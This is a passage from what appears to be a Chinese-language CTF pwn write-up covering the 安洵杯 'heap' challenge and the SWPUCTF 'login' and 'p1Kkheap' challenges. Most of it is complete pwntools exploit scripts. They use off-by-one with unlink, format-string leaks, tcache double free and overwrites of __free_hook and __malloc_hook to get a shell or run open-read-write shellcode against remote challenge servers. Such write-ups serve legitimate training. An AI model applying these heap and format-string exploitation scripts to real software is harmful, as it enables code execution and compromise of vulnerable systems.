    Edit(0x58,'a'*0x40+p64(0)+p64(0x61)+p64(libc.sym['__malloc_hook']))
    Add(0x50,'a')
    Add(0x50,p64(shell_addr))
    p.recvuntil('> ')
    p.sendline('M')
    p.recvuntil("size > ")
    p.sendline('17')
    p.interactive()

exp()
```

## 安洵杯

### 前言

本来是想做mips pwn的，但是我可能因为IDA版本太高用mipsrop搜不到gadgets，搭了个环境就放弃辽qwq，其他四道题还算简单，这里记录一道heap

### heap

edit里可以off-by-one，通过pintf泄露出Proc_base和libc，unlink即可

```py
#coding=utf-8
from pwn import *
context.update(arch='amd64',os='linux',log_level='DEBUG')
context.terminal = ['tmux','split','-h']
debug = 1
elf = ELF('./axb_2019_heap')
libc_offset = 0x3c4b20
gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
if debug:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    p = process('./axb_2019_heap')

else:
    libc = ELF('./x64_libc.so.6')
    p = remote('f.buuoj.cn',20173)

def Add(idx,size,content):
    p.recvuntil('>> ')
    p.sendline('1')
    p.recvuntil("Enter the index you want to create (0-10):")
    p.sendline(str(idx))
    p.recvuntil("Enter a size:\n")
    p.sendline(str(size))
    p.recvuntil("Enter the content: \n")
    p.send(content)

def Edit(index,content):
    p.recvuntil('>> ')
    p.sendline('4')
    p.recvuntil("Enter an index:\n")
    p.sendline(str(index))
    p.recvuntil("Enter the content: \n")
    p.send(content)

def Delete(index):
    p.recvuntil('>> ')
    p.sendline('2')
    p.recvuntil("Enter an index:\n")
    p.sendline(str(index))

def exp():

    p.recvuntil("Enter your name: ")
    p.sendline("%22$p%15$p")
    p.recvuntil("Hello, ")
    #
    p.recvuntil("0x")
    proc_base = int(p.recvuntil("0x",drop=True),16) - 0x980
    log.success("proc base => " + hex(proc_base))
    #
    libc_base  = int(p.recvline().strip("\n"),16) - 240 - libc.sym['__libc_start_main']
    libc.address = libc_base
    log.success("libc base => " + hex(libc_base))
    #unlink
    Add(0,0x88,'0\n')
    Add(1,0x88,'0\n')
    Add(2,0xf8,'0\n')
    Add(3,0x88,'0\n')
    Delete(1)
    Add(1,0x88,'1'*0x80+p64(0x110)+'\x00')
    fd = proc_base + 0x202060 - 0x18
    bk = proc_base + 0x202060 - 0x10
    Edit(0,p64(0)+p64(0x21)+p64(fd)+p64(bk)+p64(0x20)+'\n')

    Delete(2)
    Add(5,0x90,'/bin/sh\n')
    Edit(0,p64(0)*3+p64(libc.sym['__free_hook'])+p64(0x120)+'\n')
    Edit(0,p64(libc.sym['system'])+'\n')
    #Edit(0,chr(0x2b)+'\n')


    #gdb.attach(p)
    #Edit(0,p64(0x2b)+p64(0)*3+p64(libc.sym['__free_hook'])+'\n')
    Delete(5)

    p.interactive()

exp()

```

## SWPUCTF

### login

32位print，buf在bss中，需要找两个二级指针，覆写retn_addr和arg位置即可

```py
#coding=utf-8
from pwn import *
context.update(arch='i386',os='linux',log_level='DEBUG')
context.terminal = ['tmux','split','-h']
debug = 1
elf = ELF('./SWPUCTF_2019_login')

if debug:
    libc = ELF('/lib32/libc.so.6')
    p = process('./SWPUCTF_2019_login')
    gadgets = [0x3ac5c,0x3ac5e,0x3ac62,0x3ac69,0x5fbc5,0x5fbc6]
else:
    gadgets = [0x3a80c,0x3a80e,0x3a812,0x3a819,0x5f065,0x5f066]
    libc = ELF('./x86_libc.so.6')
    p = remote('f.buuoj.cn',20171)


def exp():
    #leak libc
    p.recvuntil("Please input your name: \n")
    p.send("/bin/sh\x00")
    p.recvuntil("Please input your password: \n")
    gdb.attach(p,'b printf')
    p.send("+%15$p-+%13$p-")
    p.recvuntil('+')
    libc_base = int(p.recvuntil("-",drop=True),16) - 247 - libc.sym['__libc_start_main']
    log.success("libc base => " + hex(libc_base))
    #leak stack
    p.recvuntil('+')
    ebp_addr = int(p.recvuntil("-",drop=True),16) - 56
    log.success("ebp addr => " + hex(ebp_addr))

    p.interactive()

exp()
```

### p1Kkheap

#### 程序逻辑 & 漏洞利用

题目开了沙箱禁了execve，double free，libc 2.27，只能free3次，有点像SCTF的one_heap，给了4次free，不过这里有edit要好得多。程序还有Show，所有操作次数要小于等于18次。

首先double free，再Malloc三次让tcache的count为0xff(>7)，再释放一个这个大小的chunk即可进ub，泄露libc。  

之前double free的时候有一次任意地址分配的机会，我们分配到tcache_perthread_struct，从而可以通过Edit控制得到tcache bins，题目给了块rwxp的区域，我们分配到那里写shecllode再将mallo_hook覆写为mmap_addr，最后trigger到orw读取flag。

```py
#coding=utf-8
from pwn import *
context.update(arch='amd64',os='linux',log_level='DEBUG')
context.terminal = ['tmux','split','-h']
debug = 0
elf = ELF('./SWPUCTF_2019_p1KkHeap')
libc_offset = 0x3c4b20
gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
if debug:

    p = process('./SWPUCTF_2019_p1KkHeap')

else:
    p = remote('node3.buuoj.cn',29346)

def Add(size):
    p.recvuntil('Choice: ')
    p.sendline('1')
    p.recvuntil("size: ")
    p.sendline(str(size))

def Show(index):
    p.recvuntil('Choice: ')
    p.sendline('2')
    p.recvuntil("id: ")
    p.sendline(str(index))

def Delete(index):
    p.recvuntil('Choice: ')
    p.sendline('4')
    p.recvuntil("id: ")
    p.sendline(str(index))

def Edit(index,content):
    p.recvuntil('Choice: ')
    p.sendline('3')
    p.recvuntil("id: ")
    p.sendline(str(index))
    p.recvuntil("content: ")
    p.send(content)

def exp():
    #leak heap
    map_addr = 0x66660000
    Add(0x100)#0
    Add(0x68)#1
    Delete(0)
    Delete(0)
    Show(0)
    p.recvuntil("content: ")
    heap_base = u64(p.recvline().strip("\n").ljust(8,'\x00')) - 0x260
    log.success("libc base => " + hex(heap_base))
    Add(0x100)#2
    Edit(2,p64(heap_base+0x10))
    Add(0x100)#3

    Add(0x100)#4 target
    Delete(0)
    Show(0)
    p.recvuntil("content: ")
    libc_base = u64(p.recvline().strip("\n").ljust(8,'\x00')) - 96 - 0x10 - libc.sym['__malloc_hook']
    libc.address = libc_base
    log.success("libc base => " + hex(libc_base))
    payload = p64(0)+p64(0x2000000000000)+p64(0)*7+p64(0)*13
    payload += p64(map_addr)
    Edit(4,payload)

    #
    p_rdi = libc_base + 0x000000000002155f
    p_rdx_rsi = libc_base + 0x00000000001306d9
    p_rax = libc_base + 0x00000000000439c8
    syscall = libc_base + 0x00000000000d2975
    Add(0xf0)#5
    '''
    sc = "./flag\x00\x00"
    sc += p64(p_rdi)+p64(map_addr)+p64(p_rdx_rsi)+p64(0)*2+p64(p_rax)+p64(2)+p64(syscall)
    sc += p64(p_rdi)+p64(3)+p64(p_rdx_rsi)+p64(0x20)+p64(heap_base+0x260)+p64(p_rax)+p64(0)+p64(syscall)
    sc += p64(p_rdi)+p64(1)+p64(p_rdx_rsi)+p64(0x20)+p64(heap_base+0x260)+p64(p_rax)+p64(1)+p64(syscall)
    '''
    sc = "./flag\x00"
    sc += asm('''
    mov rdi,0x66660000
    xor rsi,rsi
    xor rdx,rdx
    mov rax,2
    syscall
    mov rdi,rax
    mov rsi,0x66660200
    mov rdx,0x30
    mov rax,0
    syscall
    mov rdi,1
    mov rsi,0x66660200
    mov rdx,0x30
    mov rax,1
    syscall
            ''')
    Edit(5,sc)
    #
    Edit(4,p64(0x2)+p64(0)*7+p64(libc.sym['__malloc_hook']))

    Add(0x18)#6
    Edit(6,p64(map_addr+8))
    Add(17)

    p.interactive()

exp()
```
